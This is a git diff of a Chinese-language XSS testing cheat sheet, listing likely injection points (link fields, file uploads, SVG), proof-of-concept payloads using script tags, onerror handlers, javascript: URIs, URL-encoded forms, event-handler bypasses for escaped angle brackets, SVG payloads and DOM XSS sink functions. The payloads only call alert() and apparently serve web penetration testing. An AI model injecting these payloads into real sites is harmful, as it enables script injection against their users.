@@ -1,3 +1,10 @@
+## 可能出现xss漏洞的位置
+- 所有配置超链接的地方  
+使用www.baidu.com 测试是否可以重定向，然后url配置为`javascript:alert('xss');`  
+- 文件上传的地方
+上传文件修改为 `.html` ，内容为 `<image src=1 onerror=alert(document.domain)>`，然后去访问这个文件   
+- svg插入xss	
+
 ## 常用POC:
 - `"><script>alert(1)</script>`  
 - `<image src=1 onerror=alert(1)>`  
@@ -22,7 +29,12 @@ JavaScript伪协议，超链接的地方就可能会存在
 ` ${alert(1)} `
 - url编码  
 ` %27%2dalert(1)%2d%27 `  
-`%3Ca%20hREf%20%3D%20%27javasCriPt%3Aalert(%2Fxss%2F)%27%3Eclick%20me!%3C%2Fa%3E` javascript伪协议  
+`%3Ca%20hREf%20%3D%20%27javasCriPt%3Aalert(%2Fxss%2F)%27%3Eclick%20me!%3C%2Fa%3E` javascript伪协议 
+- 尖括号被转义绕过
+尝试利用事件执行xss，这里我主要采用与用户接口(鼠标、键盘)相关的事件，如click、mouseover等：  
+```html
+<span title="" onmouseover="alert(/XSS/)">" onmouseover="alert(/XSS/)</span>
+``` 
 
 ## 事件执行触发POC:
 - accesskey:设置快捷键  
@@ -33,15 +45,16 @@ JavaScript伪协议，超链接的地方就可能会存在
 `<span title="" onclick="alert(1)">" onclick="alert(1)"</span>`
 
 ## SVG
-```
+```html
 <svg version="1.1" xmlns="http://www.w3.org/2000/svg">
 	<circle cx="100" cy="50" r="40" stroke="black" stroke-width="2" fill="red" />
 	<script>alert(1)</script>
 </svg>
-```
 
-## 上传文件导致存储型XSS
-上传文件修改为 `.html` ，内容为 `<image src=1 onerror=alert(document.domain)>`
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+	<rect width="300" height="100" onmouseover="alert(/xss/)" style="fill:rgb(0,0,255);stroke-width:3;strcke:rgb(0,0,0)">
+</svg>
+```
 
 ## DOM XSS出现位置函数
 `document.write、location.search、eval（）、location、someDOMElement.innerHTML/uterHTML/insertAdjacentHTML/onevent`
